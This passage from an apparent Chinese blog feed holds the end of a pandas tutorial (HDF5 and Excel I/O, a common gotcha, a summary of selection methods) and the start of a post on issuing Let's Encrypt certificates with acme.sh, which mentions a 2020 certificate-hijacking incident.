<td>-25.430236</td>      <td>-23.672206</td>      <td>-2.292810</td>    </tr>    <tr>      <th>987</th>      <td>2022-09-14</td>      <td>21.200064</td>      <td>-26.299390</td>      <td>-23.567706</td>      <td>-2.753986</td>    </tr>    <tr>      <th>988</th>      <td>2022-09-15</td>      <td>22.890536</td>      <td>-27.813985</td>      <td>-23.938164</td>      <td>-3.195772</td>    </tr>    <tr>      <th>989</th>      <td>2022-09-16</td>      <td>23.138447</td>      <td>-25.855344</td>      <td>-24.390078</td>      <td>-3.612660</td>    </tr>    <tr>      <th>990</th>      <td>2022-09-17</td>      <td>23.163567</td>      <td>-26.157774</td>      <td>-24.309178</td>      <td>-3.155928</td>    </tr>    <tr>      <th>991</th>      <td>2022-09-18</td>      <td>20.973996</td>      <td>-27.319631</td>      <td>-22.948785</td>      <td>-4.487101</td>    </tr>    <tr>      <th>992</th>      <td>2022-09-19</td>      <td>21.090756</td>      <td>-26.712847</td>      <td>-21.722990</td>      <td>-4.110810</td>    </tr>    <tr>      <th>993</th>      <td>2022-09-20</td>      <td>21.848391</td>      <td>-25.018472</td>      <td>-21.850579</td>      <td>-4.360523</td>    </tr>    <tr>      <th>994</th>      <td>2022-09-21</td>      <td>22.898217</td>      <td>-26.005364</td>      <td>-20.914269</td>      <td>-5.357187</td>    </tr>    <tr>      <th>995</th>      <td>2022-09-22</td>      <td>21.978310</td>      <td>-25.001244</td>      <td>-20.881626</td>      <td>-5.606849</td>    </tr>    <tr>      <th>996</th>      <td>2022-09-23</td>      <td>24.132628</td>      <td>-25.692639</td>      <td>-20.310265</td>      <td>-6.258977</td>    </tr>    <tr>      <th>997</th>      <td>2022-09-24</td>      <td>23.777794</td>      <td>-25.485527</td>      <td>-21.305882</td>      <td>-5.330284</td>    </tr>    <tr>      <th>998</th>      <td>2022-09-25</td>      <td>25.105611</td>      <td>-25.485135</td>      <td>-22.407657</td>      <td>-6.600228</td>    </tr>    <tr>      <th>999</th>      <td>2022-09-26</td>      <td>25.207099</td>      <td>-25.512208</td>      <td>-23.434955</td>      <td>-7.275999</td>    </tr>  </tbody></table><p>1000 rows × 5 columns</p></div><h3 id="0x0E-2-HDF5"><a href="#0x0E-2-HDF5" class="headerlink" title="0x0E-2 HDF5"></a>0x0E-2 HDF5</h3><p><strong>写入 HDF5 存储</strong></p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>to_hdf<span class="token punctuation">(</span><span class="token string">'foo.h5'</span><span class="token punctuation">,</span><span class="token string">'df'</span><span class="token punctuation">)</span></code></pre><p><strong>从 HDF5 存储中读取数据</strong></p><pre class=" language-python"><code class="language-python">pd<span class="token punctuation">.</span>read_hdf<span class="token punctuation">(</span><span class="token string">'foo.h5'</span><span class="token punctuation">,</span><span class="token string">'df'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-01-01</th>      <td>-1.397481</td>      <td>-0.453722</td>      <td>1.374079</td>      <td>-2.095767</td>    </tr>    <tr>      <th>2020-01-02</th>      <td>-1.363418</td>      <td>0.529293</td>      <td>0.178497</td>      <td>-2.364989</td>    </tr>    <tr>      <th>2020-01-03</th>      <td>-2.047267</td>      <td>-0.333020</td>      <td>0.379978</td>      <td>-2.628204</td>    </tr>    <tr>      <th>2020-01-04</th>      <td>-2.305870</td>      <td>-0.145598</td>      <td>-0.232491</td>      <td>-2.812290</td>    </tr>    <tr>      <th>2020-01-05</th>      <td>-1.851390</td>      <td>-1.378215</td>      <td>-1.202399</td>      <td>-4.574516</td>    </tr>    <tr>      <th>2020-01-06</th>      <td>-3.438928</td>      <td>-0.779975</td>      <td>-1.864979</td>      <td>-5.666847</td>    </tr>    <tr>      <th>2020-01-07</th>      <td>-4.201270</td>      <td>-0.827366</td>      <td>-0.796513</td>      <td>-5.267628</td>    </tr>    <tr>      <th>2020-01-08</th>      <td>-5.682762</td>      <td>-1.009404</td>      <td>-0.760801</td>      <td>-4.696243</td>    </tr>    <tr>      <th>2020-01-09</th>      <td>-4.362126</td>      <td>-0.768552</td>      <td>-0.747517</td>      <td>-5.562345</td>    </tr>    <tr>      <th>2020-01-10</th>      <td>-5.226357</td>      <td>-1.791920</td>      <td>0.290504</td>      <td>-5.214061</td>    </tr>    <tr>      <th>2020-01-11</th>      <td>-4.429691</td>      <td>-2.026951</td>      <td>-0.821212</td>      <td>-6.621030</td>    </tr>    <tr>      <th>2020-01-12</th>      <td>-4.222744</td>      <td>-2.875169</td>      <td>-0.654313</td>      <td>-5.926621</td>    </tr>    <tr>      <th>2020-01-13</th>      <td>-2.413314</td>      <td>-3.329878</td>      <td>-1.595397</td>      <td>-5.585677</td>    </tr>    <tr>      <th>2020-01-14</th>      <td>-2.769944</td>      <td>-3.536045</td>      <td>-1.463671</td>      <td>-5.098753</td>    </tr>    <tr>      <th>2020-01-15</th>      <td>-3.599683</td>      <td>-4.973067</td>      <td>-3.859425</td>      <td>-5.823875</td>    </tr>    <tr>      <th>2020-01-16</th>      <td>-3.486154</td>      <td>-4.792330</td>      <td>-2.866047</td>      <td>-6.312086</td>    </tr>    <tr>      <th>2020-01-17</th>      <td>-4.232714</td>      <td>-5.082053</td>      <td>-3.572924</td>      <td>-8.478300</td>    </tr>    <tr>      <th>2020-01-18</th>      <td>-5.346857</td>      <td>-5.787422</td>      <td>-4.313125</td>      <td>-8.595854</td>    </tr>    <tr>      <th>2020-01-19</th>      <td>-5.720494</td>      <td>-5.620498</td>      <td>-3.699862</td>      <td>-9.678113</td>    </tr>    <tr>      <th>2020-01-20</th>      <td>-5.264735</td>      <td>-4.938944</td>      <td>-2.354040</td>      <td>-8.942524</td>    </tr>    <tr>      <th>2020-01-21</th>      <td>-5.407854</td>      <td>-5.379811</td>      <td>-2.284447</td>      <td>-8.068545</td>    </tr>    <tr>      <th>2020-01-22</th>      <td>-5.793401</td>      <td>-5.501279</td>      <td>-2.254013</td>      <td>-7.997644</td>    </tr>    <tr>      <th>2020-01-23</th>      <td>-6.796539</td>      <td>-4.692782</td>      <td>-2.330458</td>      <td>-7.449650</td>    </tr>    <tr>      <th>2020-01-24</th>      <td>-7.502072</td>      <td>-4.085084</td>      <td>-1.810495</td>      <td>-6.540544</td>    </tr>    <tr>      <th>2020-01-25</th>      <td>-7.639024</td>      <td>-3.791416</td>      <td>1.214301</td>      <td>-7.599166</td>    </tr>    <tr>      <th>2020-01-26</th>      <td>-7.783544</td>      <td>-2.180918</td>      <td>1.628560</td>      <td>-7.928116</td>    </tr>    <tr>      <th>2020-01-27</th>      <td>-7.673699</td>      <td>-3.485888</td>      <td>0.640970</td>      <td>-8.124872</td>    </tr>    <tr>      <th>2020-01-28</th>      <td>-7.435098</td>      <td>-4.480212</td>      <td>-0.409425</td>      <td>-7.943383</td>    </tr>    <tr>      <th>2020-01-29</th>      <td>-6.843557</td>      <td>-5.069680</td>      <td>-1.650871</td>      <td>-7.311741</td>    </tr>    <tr>      <th>2020-01-30</th>      <td>-7.647267</td>      <td>-4.115332</td>      <td>-1.558887</td>      <td>-6.308304</td>    </tr>    <tr>      <th>...</th>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>    </tr>    <tr>      <th>2022-08-28</th>      <td>17.157914</td>      <td>-23.306973</td>      <td>-12.461653</td>      <td>-2.478731</td>    </tr>    <tr>      <th>2022-08-29</th>      <td>18.207251</td>      <td>-23.725280</td>      <td>-12.912440</td>      <td>-2.664828</td>    </tr>    <tr>      <th>2022-08-30</th>      <td>17.968302</td>      <td>-21.485150</td>      <td>-15.044877</td>      <td>-4.034060</td>    </tr>    <tr>      <th>2022-08-31</th>      <td>18.933869</td>      <td>-21.587237</td>      <td>-16.046081</td>      <td>-4.014128</td>    </tr>    <tr>      <th>2022-09-01</th>      <td>18.337284</td>      <td>-21.451739</td>      <td>-15.028398</td>      <td>-4.147177</td>    </tr>    <tr>      <th>2022-09-02</th>      <td>18.783912</td>      <td>-21.096423</td>      <td>-15.506137</td>      <td>-3.858413</td>    </tr>    <tr>      <th>2022-09-03</th>      <td>18.828378</td>      <td>-19.514168</td>      <td>-16.924864</td>      <td>-2.559397</td>    </tr>    <tr>      <th>2022-09-04</th>      <td>18.570511</td>      <td>-21.482747</td>      <td>-17.147155</td>      <td>-4.267082</td>    </tr>    <tr>      <th>2022-09-05</th>      <td>17.212119</td>      <td>-22.331837</td>      <td>-16.496095</td>      <td>-5.990857</td>    </tr>    <tr>      <th>2022-09-06</th>      <td>15.726498</td>      <td>-23.219830</td>      <td>-19.321023</td>      <td>-5.281962</td>    </tr>    <tr>      <th>2022-09-07</th>      <td>16.053999</td>      <td>-22.681168</td>      <td>-19.139536</td>      <td>-5.587482</td>    </tr>    <tr>      <th>2022-09-08</th>      <td>17.335456</td>      <td>-23.320514</td>      <td>-21.271891</td>      <td>-4.048170</td>    </tr>    <tr>      <th>2022-09-09</th>      <td>16.925567</td>      <td>-24.175782</td>      <td>-22.318101</td>      <td>-4.890968</td>    </tr>    <tr>      <th>2022-09-10</th>      <td>18.652048</td>      <td>-25.436089</td>      <td>-22.213175</td>      <td>-6.330027</td>    </tr>    <tr>      <th>2022-09-11</th>      <td>19.535978</td>      <td>-25.673818</td>      <td>-23.064392</td>      <td>-5.673334</td>    </tr>    <tr>      <th>2022-09-12</th>      <td>19.632355</td>      <td>-26.369119</td>      <td>-22.953900</td>      <td>-3.463010</td>    </tr>    <tr>      <th>2022-09-13</th>      <td>18.792587</td>      <td>-25.430236</td>      <td>-23.672206</td>      <td>-2.292810</td>    </tr>    <tr>      <th>2022-09-14</th>      <td>21.200064</td>      <td>-26.299390</td>      <td>-23.567706</td>      <td>-2.753986</td>    </tr>    <tr>      <th>2022-09-15</th>      <td>22.890536</td>      <td>-27.813985</td>      <td>-23.938164</td>      <td>-3.195772</td>    </tr>    <tr>      <th>2022-09-16</th>      <td>23.138447</td>      <td>-25.855344</td>      <td>-24.390078</td>      <td>-3.612660</td>    </tr>    <tr>      <th>2022-09-17</th>      <td>23.163567</td>      <td>-26.157774</td>      <td>-24.309178</td>      <td>-3.155928</td>    </tr>    <tr>      <th>2022-09-18</th>      <td>20.973996</td>      <td>-27.319631</td>      <td>-22.948785</td>      <td>-4.487101</td>    </tr>    <tr>      <th>2022-09-19</th>      <td>21.090756</td>      <td>-26.712847</td>      <td>-21.722990</td>      <td>-4.110810</td>    </tr>    <tr>      <th>2022-09-20</th>      <td>21.848391</td>      <td>-25.018472</td>      <td>-21.850579</td>      <td>-4.360523</td>    </tr>    <tr>      <th>2022-09-21</th>      <td>22.898217</td>      <td>-26.005364</td>      <td>-20.914269</td>      <td>-5.357187</td>    </tr>    <tr>      <th>2022-09-22</th>      <td>21.978310</td>      <td>-25.001244</td>      <td>-20.881626</td>      <td>-5.606849</td>    </tr>    <tr>      <th>2022-09-23</th>      <td>24.132628</td>      <td>-25.692639</td>      <td>-20.310265</td>      <td>-6.258977</td>    </tr>    <tr>      <th>2022-09-24</th>      <td>23.777794</td>      <td>-25.485527</td>      <td>-21.305882</td>      <td>-5.330284</td>    </tr>    <tr>      <th>2022-09-25</th>      <td>25.105611</td>      <td>-25.485135</td>      <td>-22.407657</td>      <td>-6.600228</td>    </tr>    <tr>      <th>2022-09-26</th>      <td>25.207099</td>      <td>-25.512208</td>      <td>-23.434955</td>      <td>-7.275999</td>    </tr>  </tbody></table><p>1000 rows × 4 columns</p></div><h3 id="0x0E-3-Excel"><a href="#0x0E-3-Excel" class="headerlink" title="0x0E-3 Excel"></a>0x0E-3 Excel</h3><p>看网上说，相对于 xlwt、xlrd 之类的库，用 pandas 来对 excel 进行<strong>数据处理和分析</strong>挺不错的，正好最近也想试试呢。</p><p><strong>写入 Excel</strong></p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>to_excel<span class="token punctuation">(</span><span class="token string">'foo.xlsx'</span><span class="token punctuation">,</span> sheet_name<span class="token operator">=</span><span class="token string">'Sheet1'</span><span class="token punctuation">)</span></code></pre><p><strong>从 excel 中读取数据</strong></p><pre class=" language-python"><code class="language-python">pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'foo.xlsx'</span><span class="token punctuation">,</span> <span class="token string">'Sheet1'</span><span class="token punctuation">,</span> index_col<span class="token operator">=</span>None<span class="token punctuation">,</span> na_values<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'NA'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Unnamed: 0</th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>2020-01-01</td>      <td>-1.397481</td>      <td>-0.453722</td>      <td>1.374079</td>      <td>-2.095767</td>    </tr>    <tr>      <th>1</th>      <td>2020-01-02</td>      <td>-1.363418</td>      <td>0.529293</td>      <td>0.178497</td>      <td>-2.364989</td>    </tr>    <tr>      <th>2</th>      <td>2020-01-03</td>      <td>-2.047267</td>      <td>-0.333020</td>      <td>0.379978</td>      <td>-2.628204</td>    </tr>    <tr>      <th>3</th>      <td>2020-01-04</td>      <td>-2.305870</td>      <td>-0.145598</td>      <td>-0.232491</td>      <td>-2.812290</td>    </tr>    <tr>      <th>4</th>      <td>2020-01-05</td>      <td>-1.851390</td>      <td>-1.378215</td>      <td>-1.202399</td>      <td>-4.574516</td>    </tr>    <tr>      <th>5</th>      <td>2020-01-06</td>      <td>-3.438928</td>      <td>-0.779975</td>      <td>-1.864979</td>      <td>-5.666847</td>    </tr>    <tr>      <th>6</th>      <td>2020-01-07</td>      <td>-4.201270</td>      <td>-0.827366</td>      <td>-0.796513</td>      <td>-5.267628</td>    </tr>    <tr>      <th>7</th>      <td>2020-01-08</td>      <td>-5.682762</td>      <td>-1.009404</td>      <td>-0.760801</td>      <td>-4.696243</td>    </tr>    <tr>      <th>8</th>      <td>2020-01-09</td>      <td>-4.362126</td>      <td>-0.768552</td>      <td>-0.747517</td>      <td>-5.562345</td>    </tr>    <tr>      <th>9</th>      <td>2020-01-10</td>      <td>-5.226357</td>      <td>-1.791920</td>      <td>0.290504</td>      <td>-5.214061</td>    </tr>    <tr>      <th>10</th>      <td>2020-01-11</td>      <td>-4.429691</td>      <td>-2.026951</td>      <td>-0.821212</td>      <td>-6.621030</td>    </tr>    <tr>      <th>11</th>      <td>2020-01-12</td>      <td>-4.222744</td>      <td>-2.875169</td>      <td>-0.654313</td>      <td>-5.926621</td>    </tr>    <tr>      <th>12</th>      <td>2020-01-13</td>      <td>-2.413314</td>      <td>-3.329878</td>      <td>-1.595397</td>      <td>-5.585677</td>    </tr>    <tr>      <th>13</th>      <td>2020-01-14</td>      <td>-2.769944</td>      <td>-3.536045</td>      <td>-1.463671</td>      <td>-5.098753</td>    </tr>    <tr>      <th>14</th>      <td>2020-01-15</td>      <td>-3.599683</td>      <td>-4.973067</td>      <td>-3.859425</td>      <td>-5.823875</td>    </tr>    <tr>      <th>15</th>      <td>2020-01-16</td>      <td>-3.486154</td>      <td>-4.792330</td>      <td>-2.866047</td>      <td>-6.312086</td>    </tr>    <tr>      <th>16</th>      <td>2020-01-17</td>      <td>-4.232714</td>      <td>-5.082053</td>      <td>-3.572924</td>      <td>-8.478300</td>    </tr>    <tr>      <th>17</th>      <td>2020-01-18</td>      <td>-5.346857</td>      <td>-5.787422</td>      <td>-4.313125</td>      <td>-8.595854</td>    </tr>    <tr>      <th>18</th>      <td>2020-01-19</td>      <td>-5.720494</td>      <td>-5.620498</td>      <td>-3.699862</td>      <td>-9.678113</td>    </tr>    <tr>      <th>19</th>      <td>2020-01-20</td>      <td>-5.264735</td>      <td>-4.938944</td>      <td>-2.354040</td>      <td>-8.942524</td>    </tr>    <tr>      <th>20</th>      <td>2020-01-21</td>      <td>-5.407854</td>      <td>-5.379811</td>      <td>-2.284447</td>      <td>-8.068545</td>    </tr>    <tr>      <th>21</th>      <td>2020-01-22</td>      <td>-5.793401</td>      <td>-5.501279</td>      <td>-2.254013</td>      <td>-7.997644</td>    </tr>    <tr>      <th>22</th>      <td>2020-01-23</td>      <td>-6.796539</td>      <td>-4.692782</td>      <td>-2.330458</td>      <td>-7.449650</td>    </tr>    <tr>      <th>23</th>      <td>2020-01-24</td>      <td>-7.502072</td>      <td>-4.085084</td>      <td>-1.810495</td>      <td>-6.540544</td>    </tr>    <tr>      <th>24</th>      <td>2020-01-25</td>      <td>-7.639024</td>      <td>-3.791416</td>      <td>1.214301</td>      <td>-7.599166</td>    </tr>    <tr>      <th>25</th>      <td>2020-01-26</td>      <td>-7.783544</td>      <td>-2.180918</td>      <td>1.628560</td>      <td>-7.928116</td>    </tr>    <tr>      <th>26</th>      <td>2020-01-27</td>      <td>-7.673699</td>      <td>-3.485888</td>      <td>0.640970</td>      <td>-8.124872</td>    </tr>    <tr>      <th>27</th>      <td>2020-01-28</td>      <td>-7.435098</td>      <td>-4.480212</td>      <td>-0.409425</td>      <td>-7.943383</td>    </tr>    <tr>      <th>28</th>      <td>2020-01-29</td>      <td>-6.843557</td>      <td>-5.069680</td>      <td>-1.650871</td>      <td>-7.311741</td>    </tr>    <tr>      <th>29</th>      <td>2020-01-30</td>      <td>-7.647267</td>      <td>-4.115332</td>      <td>-1.558887</td>      <td>-6.308304</td>    </tr>    <tr>      <th>...</th>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>    </tr>    <tr>      <th>970</th>      <td>2022-08-28</td>      <td>17.157914</td>      <td>-23.306973</td>      <td>-12.461653</td>      <td>-2.478731</td>    </tr>    <tr>      <th>971</th>      <td>2022-08-29</td>      <td>18.207251</td>      <td>-23.725280</td>      <td>-12.912440</td>      <td>-2.664828</td>    </tr>    <tr>      <th>972</th>      <td>2022-08-30</td>      <td>17.968302</td>      <td>-21.485150</td>      <td>-15.044877</td>      <td>-4.034060</td>    </tr>    <tr>      <th>973</th>      <td>2022-08-31</td>      <td>18.933869</td>      <td>-21.587237</td>      <td>-16.046081</td>      <td>-4.014128</td>    </tr>    <tr>      <th>974</th>      <td>2022-09-01</td>      <td>18.337284</td>      <td>-21.451739</td>      <td>-15.028398</td>      <td>-4.147177</td>    </tr>    <tr>      <th>975</th>      <td>2022-09-02</td>      <td>18.783912</td>      <td>-21.096423</td>      <td>-15.506137</td>      <td>-3.858413</td>    </tr>    <tr>      <th>976</th>      <td>2022-09-03</td>      <td>18.828378</td>      <td>-19.514168</td>      <td>-16.924864</td>      <td>-2.559397</td>    </tr>    <tr>      <th>977</th>      <td>2022-09-04</td>      <td>18.570511</td>      <td>-21.482747</td>      <td>-17.147155</td>      <td>-4.267082</td>    </tr>    <tr>      <th>978</th>      <td>2022-09-05</td>      <td>17.212119</td>      <td>-22.331837</td>      <td>-16.496095</td>      <td>-5.990857</td>    </tr>    <tr>      <th>979</th>      <td>2022-09-06</td>      <td>15.726498</td>      <td>-23.219830</td>      <td>-19.321023</td>      <td>-5.281962</td>    </tr>    <tr>      <th>980</th>      <td>2022-09-07</td>      <td>16.053999</td>      <td>-22.681168</td>      <td>-19.139536</td>      <td>-5.587482</td>    </tr>    <tr>      <th>981</th>      <td>2022-09-08</td>      <td>17.335456</td>      <td>-23.320514</td>      <td>-21.271891</td>      <td>-4.048170</td>    </tr>    <tr>      <th>982</th>      <td>2022-09-09</td>      <td>16.925567</td>      <td>-24.175782</td>      <td>-22.318101</td>      <td>-4.890968</td>    </tr>    <tr>      <th>983</th>      <td>2022-09-10</td>      <td>18.652048</td>      <td>-25.436089</td>      <td>-22.213175</td>      <td>-6.330027</td>    </tr>    <tr>      <th>984</th>      <td>2022-09-11</td>      <td>19.535978</td>      <td>-25.673818</td>      <td>-23.064392</td>      <td>-5.673334</td>    </tr>    <tr>      <th>985</th>      <td>2022-09-12</td>      <td>19.632355</td>      <td>-26.369119</td>      <td>-22.953900</td>      <td>-3.463010</td>    </tr>    <tr>      <th>986</th>      <td>2022-09-13</td>      <td>18.792587</td>      <td>-25.430236</td>      <td>-23.672206</td>      <td>-2.292810</td>    </tr>    <tr>      <th>987</th>      <td>2022-09-14</td>      <td>21.200064</td>      <td>-26.299390</td>      <td>-23.567706</td>      <td>-2.753986</td>    </tr>    <tr>      <th>988</th>      <td>2022-09-15</td>      <td>22.890536</td>      <td>-27.813985</td>      <td>-23.938164</td>      <td>-3.195772</td>    </tr>    <tr>      <th>989</th>      <td>2022-09-16</td>      <td>23.138447</td>      <td>-25.855344</td>      <td>-24.390078</td>      <td>-3.612660</td>    </tr>    <tr>      <th>990</th>      <td>2022-09-17</td>      <td>23.163567</td>      <td>-26.157774</td>      <td>-24.309178</td>      <td>-3.155928</td>    </tr>    <tr>      <th>991</th>      <td>2022-09-18</td>      <td>20.973996</td>      <td>-27.319631</td>      <td>-22.948785</td>      <td>-4.487101</td>    </tr>    <tr>      <th>992</th>      <td>2022-09-19</td>      <td>21.090756</td>      <td>-26.712847</td>      <td>-21.722990</td>      <td>-4.110810</td>    </tr>    <tr>      <th>993</th>      <td>2022-09-20</td>      <td>21.848391</td>      <td>-25.018472</td>      <td>-21.850579</td>      <td>-4.360523</td>    </tr>    <tr>      <th>994</th>      <td>2022-09-21</td>      <td>22.898217</td>      <td>-26.005364</td>      <td>-20.914269</td>      <td>-5.357187</td>    </tr>    <tr>      <th>995</th>      <td>2022-09-22</td>      <td>21.978310</td>      <td>-25.001244</td>      <td>-20.881626</td>      <td>-5.606849</td>    </tr>    <tr>      <th>996</th>      <td>2022-09-23</td>      <td>24.132628</td>      <td>-25.692639</td>      <td>-20.310265</td>      <td>-6.258977</td>    </tr>    <tr>      <th>997</th>      <td>2022-09-24</td>      <td>23.777794</td>      <td>-25.485527</td>      <td>-21.305882</td>      <td>-5.330284</td>    </tr>    <tr>      <th>998</th>      <td>2022-09-25</td>      <td>25.105611</td>      <td>-25.485135</td>      <td>-22.407657</td>      <td>-6.600228</td>    </tr>    <tr>      <th>999</th>      <td>2022-09-26</td>      <td>25.207099</td>      <td>-25.512208</td>      <td>-23.434955</td>      <td>-7.275999</td>    </tr>  </tbody></table><p>1000 rows × 5 columns</p></div><h2 id="0x0F-陷阱-Gotchas"><a href="#0x0F-陷阱-Gotchas" class="headerlink" title="0x0F 陷阱 Gotchas"></a>0x0F 陷阱 Gotchas</h2><p>如果你在运行中看到例如下面的异常。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I was true"</span><span class="token punctuation">)</span></code></pre><pre><code>---------------------------------------------------------------------------ValueError                                Traceback (most recent call last)&lt;ipython-input-304-5c782b38cd2f&gt; in &lt;module&gt;----&gt; 1 if pd.Series([False, True, False]):      2     print("I was true")D:\Programs\Anaconda\lib\site-packages\pandas\core\generic.py in __nonzero__(self)   1476         raise ValueError("The truth value of a {0} is ambiguous. "   1477                          "Use a.empty, a.bool(), a.item(), a.any() or a.all()."-&gt; 1478                          .format(self.__class__.__name__))   1479    1480     __bool__ = __nonzero__ValueError: The truth value of a Series is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all().</code></pre><p>可以参考 <a href="https://pandas.pydata.org/pandas-docs/version/0.22.0/basics.html#basics-compare" target="_blank" rel="noopener">Comparisons</a> 这里来寻求解释和下一步的方案。</p><p>也可以参考 <a href="https://pandas.pydata.org/pandas-docs/version/0.22.0/gotchas.html#gotchas" target="_blank" rel="noopener">Comparisons</a>。</p><p><em>（上面都是官方的文档地址）</em></p><p>（官方文档到这里就结束了）</p><br><hr><h2 id="0x10-小结"><a href="#0x10-小结" class="headerlink" title="0x10 小结"></a>0x10 小结</h2><p><strong>关于选取：</strong></p><ul><li>选择<strong>整行/整列</strong>，或<strong>多个整行/多个整列</strong>的数据，可以用<code>df[]</code>、<code>df.loc[]</code>、<code>df.iloc[]</code>这三种用法。</li><li><strong>区域选取</strong>，分为<strong>标签索引</strong>和<strong>整数索引</strong><ul><li>标签索引：<code>df.loc[]</code></li><li>整数索引：<code>df.iloc[]</code></li></ul></li><li><strong>选取单元格</strong>：<code>df.at[]</code>、<code>df.iat[]</code>、<code>df.loc[]</code>、<code>df.iloc[]</code> 都可以，要注意参数。<code>df[]</code>不行！</li><li>关于选取的返回值：<ul><li>返回值包括<strong>单行多列</strong>或<strong>多行单列</strong>时，返回值为 Series 对象</li><li>返回值包括<strong>多行多列</strong>时，返回值为 DataFrame 对象</li><li>返回值仅为一个单元格（单行单列）时，返回值为（可能是 numpy 的）基本数据类型，例如 str, float64, int64 等</li><li><code>df[]</code>因为不能精确到单元格，所以返回值一定 DataFrame 或 Series 对象</li></ul></li><li>当使用 DataFrame 的默认索引（整数索引）时，整数索引即为标签索引。</li></ul><p>其实 pandas 还有很多有用的 API 这里面还没介绍，后面有空再慢慢了解呢。</p><p>做项目的时候看看别人做过的实例，再深入看看相关的 API 好了。</p><p>大概就这些内容了吧。</p><p>（溜了溜了</p><p><strong>20200418 更新：</strong></p><p><strong>Jupyter Notebook 文档</strong> (<code>.ipynb</code>) 放到 GitHub 上了，详见这里：<a href="https://github.com/miaotony/DataScience/blob/master/10_Minutes_to_pandas.ipynb" target="_blank" rel="noopener">https://github.com/miaotony/DataScience/blob/master/10_Minutes_to_pandas.ipynb</a></p><p>下载文档的话 <a href="https://cdn.jsdelivr.net/gh/miaotony/DataScience@master/10_Minutes_to_pandas.ipynb" target="_blank" rel="noopener">戳这里（CDN，推荐）</a> 呢！或者 <a href="https://raw.githubusercontent.com/miaotony/DataScience/master/10_Minutes_to_pandas.ipynb" target="_blank" rel="noopener">也可以戳这里（GitHub raw）</a>！</p><hr><h2 id="0xFF-References-amp-Extensive-Reading"><a href="#0xFF-References-amp-Extensive-Reading" class="headerlink" title="0xFF References &amp; Extensive Reading"></a>0xFF References &amp; Extensive Reading</h2><p><a href="https://pandas.pydata.org/pandas-docs/version/0.22.0/10min.html" target="_blank" rel="noopener">官方的 10 Minutes to pandas</a></p><p><a href="https://www.cnblogs.com/chenhuabin/p/10485549.html" target="_blank" rel="noopener">python数据分析之pandas数据选取：df[] df.loc[] df.iloc[] df.ix[] df.at[] df.iat[]</a></p><p><a href="https://www.zhihu.com/question/56310477/answer/873227129" target="_blank" rel="noopener">学习python中的pandas有没有好的教程推荐？</a></p><p><a href="https://zhuanlan.zhihu.com/p/97617276" target="_blank" rel="noopener">从Excel到Python：最常用的36个Pandas函数！</a></p><p>etc.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> DataScience </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Develop </tag>
            
            <tag> DataScience </tag>
            
            <tag> pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于acme.sh从Let&#39;s encrypt生成免费且自动更新的SSL证书</title>
      <link href="/2020/03/28/Server_IssueACertWithACME/"/>
      <url>/2020/03/28/Server_IssueACertWithACME/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>3月26日，一堆 GitHub Pages 以及 jd.com 等网站的 SSL 证书被一个自签名证书 （<code>C=CN; ST=GD; L=SZ; O=COM; OU=NSP; CN=SERVER; emailAddress=346608453@qq.com</code> ）劫持了，开启了 HSTS 则会被浏览器拦下来。不过套了 CF 的 CDN 则不受影响。27日发现 <code>*.github.io</code> 好了，GitHub 主站被劫持了……（真狠啊</p><blockquote><p>具体参考这几篇：</p><p><a href="https://www.v2ex.com/t/656367" target="_blank" rel="noopener">https://www.v2ex.com/t/656367</a><br><a href="https://www.v2ex.com/t/656394" target="_blank" rel="noopener">https://www.v2ex.com/t/656394</a><br><a href="https://m.cnbeta.com/view/960295.htm" target="_blank" rel="noopener">https://m.cnbeta.com/view/960295.htm</a><br><a href="https://blog.netlab.360.com/ongoing-websites-hijacking/" target="_blank" rel="noopener">一些网站https证书出现问题的情况分析</a>  </p><p><em>（最后这篇说很多大站都受影响了</em></p></blockquote><p>HTTPS 加密通信挺重要的，之前也听说过 MITM（中间人攻击），不过这还是第一次听说证书被劫持的……</p><p>怎么说好呢，应该可以说网络上不能保证绝对安全吧，或者说绝对安全是不存在的。</p><p>想起来之前搭建的一个服务还没上 HTTPS，然而想不起来之前是怎么配置 SSL 证书的了，<em>然后又得去找资料<del>烦死了</del>，</em>于是这回顺便来记录一下好了啦。（摊手</p><p><strong>通过 Let’s encrypt 可以获得 90 天免费且可续期的 SSL 证书，而利用 acme.sh 